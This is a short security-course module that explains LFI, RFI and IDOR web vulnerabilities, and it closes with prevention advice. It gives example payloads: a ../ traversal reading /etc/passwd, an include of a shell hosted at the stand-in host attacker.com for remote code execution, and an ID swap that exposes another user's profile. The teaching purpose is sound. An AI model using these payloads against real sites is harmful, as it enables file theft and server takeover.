# Module 10: Web Attacks III (LFI, RFI, and IDOR)

## 1. LFI (Local File Inclusion)
LFI occurs when a web application includes a file from the local server without properly validating the input. This allows an attacker to read sensitive files on the system.

### How it Works
Many sites use a "page" parameter: `index.php?page=contact.php`.
If the code is `include($_GET['page']);`, an attacker can change it to:
`index.php?page=/etc/passwd`

### Directory Traversal (The `../` Attack)
If the application prefixes the path (e.g., `include("pages/" . $_GET['page']);`), the attacker uses `../` to "climb" out of the directory.
- **Payload**: `index.php?page=../../../../etc/passwd`

## 2. RFI (Remote File Inclusion)
RFI is a more severe version of LFI. Instead of a local file, the application is tricked into including a file from a **remote server** controlled by the attacker.

### How it Works
The attacker hosts a malicious script (like a PHP shell) on their own server.
- **Payload**: `index.php?page=http://attacker.com/shell.txt`
- **Result**: The server executes the attacker's code, giving them Remote Code Execution (RCE).

## 3. IDOR (Insecure Direct Object Reference)
IDOR happens when an application provides direct access to objects based on user-supplied input, but fails to check if the user is authorized to access that object.

### How it Works
You log in and see your profile at: `http://example.com/profile?id=123`.
You change the ID to `124`: `http://example.com/profile?id=124`.
If you can now see another user's private profile, you have found an IDOR.

## 4. Prevention
- **LFI/RFI**: Never trust user input in file paths. Use a "whitelist" of allowed pages.
- **IDOR**: Always perform an authorization check on the server side: "Is User A allowed to see Object 124?"
